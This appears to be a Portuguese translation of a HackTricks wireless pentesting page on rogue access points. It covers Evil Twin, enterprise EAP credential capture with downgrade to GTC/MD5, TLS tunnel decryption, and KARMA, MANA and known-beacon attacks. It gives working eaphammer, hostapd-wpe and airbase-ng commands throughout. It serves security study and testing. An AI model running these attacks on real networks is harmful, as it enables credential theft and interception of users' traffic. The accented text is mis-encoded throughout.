## Teoria de Ataques a Clientes

### Sele√ß√£o de Rede e Roaming

Embora o protocolo 802.11 tenha regras muito espec√≠ficas que ditam como uma esta√ß√£o pode se juntar a um ESS, ele n√£o especifica como a esta√ß√£o deve selecionar um ESS para se conectar. Al√©m disso, o protocolo permite que as esta√ß√µes roam livremente entre pontos de acesso que compartilham o mesmo ESSID (porque voc√™ n√£o gostaria de perder a conectividade WiFi ao caminhar de um lado de um pr√©dio para outro, etc). No entanto, o protocolo 802.11 n√£o especifica como esses pontos de acesso devem ser selecionados. Al√©m disso, mesmo que as esta√ß√µes devam ser autenticadas ao ESS para se associarem a um ponto de acesso, o protocolo 802.11 n√£o exige que o ponto de acesso seja autenticado √† esta√ß√£o.

### Listas de Redes Preferenciais (PNLs)

Cada vez que uma esta√ß√£o se conecta a uma rede sem fio, o ESSID da rede √© armazenado na Lista de Redes Preferenciais (PNL) da esta√ß√£o. A PNL √© uma lista ordenada de todas as redes √†s quais a esta√ß√£o se conectou no passado, e cada entrada na PNL cont√©m o ESSID da rede e quaisquer informa√ß√µes de configura√ß√£o espec√≠ficas da rede necess√°rias para estabelecer uma conex√£o.

### Varredura Passiva

Em redes de infraestrutura, os pontos de acesso transmitem periodicamente quadros de beacon para anunciar sua presen√ßa e capacidades para as esta√ß√µes pr√≥ximas. Beacons s√£o quadros de broadcast, o que significa que s√£o destinados a ser recebidos por todas as esta√ß√µes pr√≥ximas dentro do alcance. Beacons incluem informa√ß√µes sobre as taxas suportadas pelo AP, capacidades de criptografia, informa√ß√µes adicionais e, mais importante, quadros de beacon cont√™m o ESSID do AP (desde que a transmiss√£o do ESSID n√£o esteja desativada).

Durante a varredura passiva, o dispositivo cliente escuta quadros de beacon de pontos de acesso pr√≥ximos. Se o dispositivo cliente receber um quadro de beacon cujo campo ESSID corresponda a um ESSID da PNL do cliente, o cliente se conectar√° automaticamente ao ponto de acesso que enviou o quadro de beacon. Ent√£o, suponha que queremos mirar em um dispositivo sem fio que n√£o est√° atualmente conectado a nenhum wireless. Se soubermos pelo menos uma entrada na PNL desse cliente, podemos for√ßar o cliente a se conectar a n√≥s simplesmente criando nosso pr√≥prio ponto de acesso com o ESSID dessa entrada.

### Sondagem Ativa

O segundo algoritmo de sele√ß√£o de rede usado no 802.11 √© conhecido como Sondagem Ativa. Dispositivos clientes que usam sondagem ativa transmitem continuamente quadros de solicita√ß√£o de sondagem para determinar quais APs est√£o ao alcance, bem como quais s√£o suas capacidades. Solicita√ß√µes de sondagem v√™m em duas formas: direcionadas e de broadcast. Solicita√ß√µes de sondagem direcionadas s√£o endere√ßadas a um ESSID espec√≠fico e s√£o a maneira do cliente verificar se uma rede espec√≠fica est√° por perto.

Clientes que usam sondagem direcionada enviar√£o solicita√ß√µes de sondagem para cada rede em sua PNL. Deve-se notar que a sondagem direcionada √© a √∫nica maneira de identificar a presen√ßa de redes ocultas pr√≥ximas. Solicita√ß√µes de sondagem de broadcast funcionam quase exatamente da mesma maneira, mas s√£o enviadas com o campo SSID definido como NULL. Isso endere√ßa a sondagem de broadcast a todos os pontos de acesso pr√≥ximos, permitindo que a esta√ß√£o verifique se alguma de suas redes preferenciais est√° por perto sem revelar o conte√∫do de sua PNL

## AP Simples com redirecionamento para a Internet

Antes de explicar como realizar ataques mais complexos, ser√° explicado **como** simplesmente **criar** um **AP** e **redirecionar** seu **tr√°fego** para uma interface conectada **√†** **Internet**.

Usando `ifconfig -a`, verifique se a interface wlan para criar o AP e a interface conectada √† Internet est√£o presentes.

### DHCP & DNS
```bash
apt-get install dnsmasq #Manages DHCP and DNS
```
crie um arquivo de configura√ß√£o _/etc/dnsmasq.conf_ da seguinte forma:
```
interface=wlan0
dhcp-authoritative
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
```
Ent√£o **defina IPs** e **rotas**:
```
ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
```
E ent√£o **inicie** o dnsmasq:
```
dnsmasq -C dnsmasq.conf -d
```
### hostapd
```
apt-get install hostapd
```
Criar um arquivo de configura√ß√£o _hostapd.conf:_
```
interface=wlan0
driver=nl80211
ssid=MITIWIFI
hw_mode=g
channel=11
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=mitmwifi123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_group_rekey=86400
ieee80211n=1
wme_enabled=1
```
**Interrompa processos inc√¥modos**, defina o **modo monitor** e **inicie o hostapd**:
```
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
hostapd ./hostapd.conf
```
### Encaminhamento e Redirecionamento
```bash
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
```
## Evil Twin

Um ataque Evil Twin √© um tipo de ataque Wi-Fi que se aproveita do fato de que a maioria dos computadores e telefones s√≥ ver√° o "nome" ou ESSID de uma rede sem fio (j√° que a esta√ß√£o base n√£o √© obrigada a se autenticar contra o cliente). Isso torna muito dif√≠cil distinguir entre redes com o mesmo nome e mesmo tipo de criptografia. De fato, muitas redes ter√£o v√°rios pontos de acesso para extens√£o de rede, todos usando o mesmo nome para expandir o acesso sem confundir os usu√°rios.

Devido √† forma como a implementa√ß√£o dos clientes funciona (lembre-se de que o protocolo 802.11 permite que as esta√ß√µes roam livremente entre pontos de acesso dentro do mesmo ESS), √© poss√≠vel fazer com que um dispositivo mude a esta√ß√£o base √† qual est√° conectado. Isso pode ser feito oferecendo um sinal melhor (o que nem sempre √© poss√≠vel) ou bloqueando o acesso √† esta√ß√£o base original (pacotes de desautentica√ß√£o, jamming ou alguma outra forma de ataque DoS).

Observe tamb√©m que as implementa√ß√µes reais de redes sem fio geralmente t√™m mais de um ponto de acesso, e esses pontos de acesso costumam ser mais potentes e ter um alcance melhor de linha de vis√£o devido ao seu posicionamento em dire√ß√£o ao teto. Desautenticar um √∫nico ponto de acesso geralmente resulta no roaming do alvo para outro ponto de acesso v√°lido, em vez do seu AP malicioso, a menos que todos os pontos de acesso pr√≥ximos sejam desautenticados (barulhento) ou voc√™ seja muito cuidadoso com o posicionamento do AP malicioso (dif√≠cil).

Voc√™ pode criar um Evil Twin Open muito b√°sico (sem capacidade de rotear tr√°fego para a Internet) fazendo:
```bash
airbase-ng -a 00:09:5B:6F:64:1E --essid "Elroy" -c 1 wlan0mon
```
Voc√™ tamb√©m pode criar um G√™meo Maligno usando **eaphammer** (observe que para criar g√™meos malignos com eaphammer a interface **N√ÉO deve estar** em modo **monitor**):
```
./eaphammer -i wlan0 --essid exampleCorp --captive-portal
```
Ou usando Airgeddon: `Op√ß√µes: 5,6,7,8,9 (dentro do menu de ataque Evil Twin).`

![](<../../.gitbook/assets/image (148).png>)

Por favor, note que por padr√£o, se um ESSID na PNL estiver salvo como protegido por WPA, o dispositivo n√£o se conectar√° automaticamente a um Evil Twin aberto. Voc√™ pode tentar fazer DoS no AP real e esperar que o usu√°rio se conecte manualmente ao seu Evil Twin aberto, ou voc√™ pode fazer DoS no AP real e usar um Evil Twin WPA para capturar o handshake (usando este m√©todo voc√™ n√£o poder√° permitir que a v√≠tima se conecte a voc√™, pois voc√™ n√£o conhece o PSK, mas pode capturar o handshake e tentar decifr√°-lo).

_Alguns SO e AV alertar√£o o usu√°rio de que conectar-se a uma rede aberta √© perigoso..._

### WPA/WPA2 Evil Twin

Voc√™ pode criar um **Evil Twin usando WPA/2** e se os dispositivos estiverem configurados para se conectar a esse SSID com WPA/2, eles tentar√£o se conectar. De qualquer forma, **para completar o 4-way-handshake**, voc√™ tamb√©m precisa **saber** a **senha** que o cliente vai usar. Se voc√™ **n√£o souber**, a **conex√£o n√£o ser√° completada**.
```
./eaphammer -i wlan0 -e exampleCorp -c 11 --creds --auth wpa-psk --wpa-passphrase "mywifipassword"
```
### Enterprise Evil Twin

Para entender esses ataques, recomendo ler antes a breve [explica√ß√£o sobre WPA Enterprise](./#wpa-enterprise-mgt).

**Usando hostapd-wpe**

`hostapd-wpe` precisa de um arquivo de **configura√ß√£o** para funcionar. Para **automatizar** a gera√ß√£o dessas configura√ß√µes, voc√™ pode usar [https://github.com/WJDigby/apd_launchpad](https://github.com/WJDigby/apd_launchpad) (baixe o arquivo python dentro de _/etc/hostapd-wpe/_)
```
./apd_launchpad.py -t victim -s PrivateSSID -i wlan0 -cn company.com
hostapd-wpe ./victim/victim.conf -s
```
No arquivo de configura√ß√£o, voc√™ pode selecionar v√°rias coisas diferentes, como ssid, canal, arquivos de usu√°rio, cret/key, par√¢metros dh, vers√£o wpa e autentica√ß√£o...

[**Usando hostapd-wpe com EAP-TLS para permitir que qualquer certificado fa√ßa login.**](evil-twin-eap-tls.md)

**Usando EAPHammer**
```bash
# Generate Certificates
./eaphammer --cert-wizard

# Launch Attack
./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
```
Por padr√£o, o EAPHammer utiliza estes m√©todos de autentica√ß√£o (observe o GTC como o primeiro a ser tentado para obter senhas em texto puro e, em seguida, o uso de m√©todos de autentica√ß√£o mais robustos):
```
GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5
```
Esta √© a metodologia padr√£o para evitar tempos de conex√£o longos. No entanto, voc√™ tamb√©m pode especificar para o servidor os m√©todos de autentica√ß√£o do mais fraco ao mais forte:
```
--negotiate weakest
```
Ou voc√™ tamb√©m pode usar:

* `--negotiate gtc-downgrade` para usar a implementa√ß√£o de rebaixamento GTC altamente eficiente (senhas em texto simples)
* `--negotiate manual --phase-1-methods PEAP,TTLS --phase-2-methods MSCHAPV2,GTC,TTLS-PAP` para especificar manualmente os m√©todos oferecidos (oferecendo os mesmos m√©todos de autentica√ß√£o na mesma ordem que a organiza√ß√£o tornar√° o ataque muito mais dif√≠cil de detectar).
* [Encontre mais informa√ß√µes no wiki](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)

**Usando Airgeddon**

`Airgeddon` pode usar certificados previamente gerados para oferecer autentica√ß√£o EAP para redes WPA/WPA2-Enterprise. A rede falsa rebaixar√° o protocolo de conex√£o para EAP-MD5, assim ser√° capaz de **capturar o usu√°rio e o MD5 da senha**. Posteriormente, o atacante pode tentar quebrar a senha.\
`Airggedon` oferece a possibilidade de um ataque **Evil Twin cont√≠nuo (barulhento)** ou **criar o Ataque Evil apenas at√© algu√©m se conectar (suave).**

![](<../../.gitbook/assets/image (129).png>)

### Depura√ß√£o de t√∫neis TLS PEAP e EAP-TTLS em ataques Evil Twins

_Este m√©todo foi testado em uma conex√£o PEAP, mas como estou descriptografando um t√∫nel TLS arbitr√°rio, isso tamb√©m deve funcionar com EAP-TTLS_

Dentro da **configura√ß√£o** do _hostapd-wpe_ **comente** a linha que cont√©m _**dh\_file**_ (de `dh_file=/etc/hostapd-wpe/certs/dh` para `#dh_file=/etc/hostapd-wpe/certs/dh`)\
Isso far√° com que `hostapd-wpe` **troque chaves usando RSA** em vez de DH, para que voc√™ possa **descriptografar** o tr√°fego mais tarde **conhecendo a chave privada do servidor**.

Agora inicie o **Evil Twin** usando **`hostapd-wpe`** com essa configura√ß√£o modificada como de costume. Al√©m disso, inicie **`wireshark`** na **interface** que est√° realizando o ataque Evil Twin.

Agora ou mais tarde (quando voc√™ j√° tiver capturado algumas tentativas de autentica√ß√£o), voc√™ pode adicionar a chave privada RSA ao wireshark em: `Editar --> Prefer√™ncias --> Protocolos --> TLS --> (lista de chaves RSA) Editar...`

Adicione uma nova entrada e preencha o formul√°rio com estes valores: **Endere√ßo IP = qualquer** -- **Porta = 0** -- **Protocolo = data** -- **Arquivo de Chave** (**selecione seu arquivo de chave**, para evitar problemas selecione um arquivo de chave **sem prote√ß√£o por senha**).

![](<../../.gitbook/assets/image (151).png>)

E veja a nova aba **"Decrypted TLS"**:

![](<../../.gitbook/assets/image (152).png>)

## KARMA, MANA, Loud MANA e ataque Known beacons

### ESSID e MAC black/whitelists

A tabela a seguir lista os diferentes tipos de MFACLs (Listas de Controle de Acesso de Quadros de Gerenciamento) dispon√≠veis, bem como seus efeitos quando utilizados:

![](<../../.gitbook/assets/image (149).png>)
```
# example EAPHammer MFACL file, wildcards can be used
78:f0:97:fc:b5:36
9a:35:e1:01:4f:cf
69:19:14:60:20:45
ce:52:b8:*:*:*

[--mac-whitelist /path/to/mac/whitelist/file.txt #EAPHammer whitelisting]
[--mac-blacklist /path/to/mac/blacklist/file.txt #EAPHammer blacklisting]
```

```
# example ESSID-based MFACL file
apples
oranges
grapes
pears

[--ssid-whitelist /path/to/mac/whitelist/file.txt]
[--ssid-blacklist /path/to/mac/blacklist/file.txt]
```
### KARMA

Ataques KARMA s√£o uma segunda forma de ataque a ponto de acesso falso que explora o processo de sele√ß√£o de rede usado por esta√ß√µes. Em um whitepaper escrito em 2005, Dino Dai Zovi e Shane Macaulay descrevem como um atacante pode configurar um ponto de acesso para ouvir solicita√ß√µes de sondagem direcionadas e responder a todas elas com respostas de sondagem direcionadas correspondentes. Isso faz com que as esta√ß√µes afetadas automaticamente enviem uma solicita√ß√£o de associa√ß√£o para o ponto de acesso do atacante. O ponto de acesso ent√£o responde com uma resposta de associa√ß√£o, fazendo com que as esta√ß√µes afetadas se conectem ao ponto de acesso do atacante.

### MANA

De acordo com Ian de Villiers e Dominic White, esta√ß√µes modernas s√£o projetadas para se protegerem contra ataques KARMA ignorando respostas de sondagem direcionadas de pontos de acesso que n√£o responderam pelo menos a uma solicita√ß√£o de sondagem de difus√£o. Isso levou a uma queda significativa no n√∫mero de esta√ß√µes vulner√°veis a ataques KARMA at√© 2015, quando White e de Villiers desenvolveram um meio de contornar tais prote√ß√µes. No ataque KARMA aprimorado de White e de Villiers (ataque MANA), respostas de sondagem direcionadas s√£o usadas para reconstruir as PNLs das esta√ß√µes pr√≥ximas. Quando uma solicita√ß√£o de sondagem de difus√£o √© recebida de uma esta√ß√£o, o ponto de acesso do atacante responde com um SSID arbitr√°rio da PNL da esta√ß√£o j√° visto em uma sondagem direta daquele dispositivo.

Em resumo, o algoritmo MANA funciona assim: cada vez que o ponto de acesso recebe uma solicita√ß√£o de sondagem, ele primeiro determina se √© uma sondagem de difus√£o ou direcionada. Se for direcionada, o endere√ßo MAC do remetente √© adicionado √† tabela de hash (se j√° n√£o estiver l√°) e o ESSID √© adicionado √† PNL daquele dispositivo. O AP ent√£o responde com uma resposta de sondagem direcionada. Se for uma sondagem de difus√£o, o ponto de acesso responde com respostas de sondagem para cada uma das redes na PNL daquele dispositivo.

Ataque MANA usando eaphammer:
```
./eaphammer -i wlan0 --cloaking full --mana --mac-whitelist whitelist.txt [--captive-portal] [--auth wpa-psk --creds]
```
### Loud MANA

Observe que o ataque MANA padr√£o ainda n√£o nos permite atacar dispositivos que n√£o utilizam sondagem direcionada. Ent√£o, se tamb√©m n√£o conhecemos previamente nenhuma entrada na PNL do dispositivo, precisamos descobrir outra maneira de atac√°-lo.

Uma possibilidade √© o que √© chamado de ataque Loud MANA. Esse ataque se baseia na ideia de que dispositivos clientes em proximidade f√≠sica uns dos outros provavelmente ter√£o pelo menos algumas entradas comuns em suas PNLs.

Em resumo, o ataque Loud MANA, em vez de responder a solicita√ß√µes de sondagem com cada ESSID na PNL de um dispositivo espec√≠fico, o AP malicioso envia respostas de sondagem para cada ESSID em todas as PNLs de todos os dispositivos que ele viu anteriormente. Relacionando isso √† teoria dos conjuntos, podemos dizer que o AP envia respostas de sondagem para cada ESSID na uni√£o de todas as PNLs dos dispositivos pr√≥ximos.
```
./eaphammer -i wlan0 --cloaking full --mana --loud [--captive-portal] [--auth wpa-psk --creds]
```
### Ataque Known Beacon

Ainda existem casos em que o ataque Loud MANA n√£o ter√° sucesso.\
O ataque Known Beacon √© uma maneira de "For√ßa Bruta" para tentar fazer com que a v√≠tima se conecte ao atacante. O atacante cria um AP que responde a qualquer ESSID e executa um c√≥digo enviando beacons que falsificam ESSIDs de cada nome dentro de uma lista de palavras. Com sorte, a v√≠tima ter√° alguns desses nomes de ESSID dentro de sua PNL e tentar√° se conectar ao AP falso.\
Eaphammer implementou esse ataque como um ataque MANA onde todos os ESSIDs dentro de uma lista s√£o carregados (voc√™ tamb√©m pode combinar isso com `--loud` para criar um ataque Loud MANA + Known beacons):
```
./eaphammer -i wlan0 --mana [--loud] --known-beacons  --known-ssids-file wordlist.txt [--captive-portal] [--auth wpa-psk --creds]
```
**Ataque Known Beacon Burst**

Como √© sabido, beacons s√£o ruidosos. Voc√™ pode usar um script dentro do projeto Eaphammer para lan√ßar beacons de cada nome ESSID dentro de um arquivo muito rapidamente. Se voc√™ combinar esse script com um ataque MANA do Eaphammer, os clientes poder√£o se conectar ao seu AP.
```
# transmit a burst of 5 forged beacon packets for each entry in list
./forge-beacons -i wlan1 \
--bssid de:ad:be:ef:13:37 \
--known-essids-file known-s.txt \
--dst-addr 11:22:33:11:22:33 \
--burst-count 5
```
## Wi-Fi Direct

Wi-Fi Direct √© um padr√£o Wi-Fi que permite que dispositivos se conectem entre si sem um AP sem fio, pois um dos dois dispositivos atuar√° como AP (chamado de propriet√°rio do grupo). Voc√™ pode encontrar Wi-Fi Direct em v√°rios dispositivos IoT, como impressoras, TVs...

Wi-Fi Direct depende do Wi-Fi Protected Setup (**WPS**) para conectar os dispositivos de forma segura. O WPS possui v√°rios m√©todos de configura√ß√£o, como Configura√ß√£o por **Push-Button** (PBC), entrada de **PIN** e Comunica√ß√£o por **Campo Pr√≥ximo** (NFC)

Portanto, os ataques anteriormente vistos ao PIN do WPS tamb√©m s√£o v√°lidos aqui se o PIN for usado.

### EvilDirect Hijacking

Isso funciona como um Evil-Twin, mas para Wi-Fi Direct, voc√™ pode se passar por um propriet√°rio de grupo para tentar fazer com que outros dispositivos, como telefones, se conectem a voc√™: `airbase-ng -c 6 -e DIRECT-5x-BRAVIA -a BB:BB:BB:BB:BB:BB mon0`

## Refer√™ncias

* [https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee](https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee)
* [https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9](https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9)
* [https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38](https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38)
* [https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d](https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d)
* [https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf](https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf)
* [http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)
* [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
* [https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d](https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d)

TODO: D√™ uma olhada em [https://github.com/wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher) (login com facebook e imita√ß√£o de WPA em portais cativos)

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Participe do servidor [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) para se comunicar com hackers experientes e ca√ßadores de recompensas por bugs!

**Insights de Hacking**\
Engaje-se com conte√∫do que explora a emo√ß√£o e os desafios do hacking

**Not√≠cias de Hacking em Tempo Real**\
Mantenha-se atualizado com o mundo acelerado do hacking atrav√©s de not√≠cias e insights em tempo real

**√öltimos An√∫ncios**\
Fique informado com os mais novos lan√ßamentos de recompensas por bugs e atualiza√ß√µes cruciais da plataforma

**Junte-se a n√≥s no** [**Discord**](https://discord.com/invite/N3FrSbmwdy) e comece a colaborar com os melhores hackers hoje!

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Participe do** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou do [**grupo telegram**](https://t.me/peass) ou **siga**-me no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas dicas de hacking enviando PRs para os reposit√≥rios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) no github.

</details>
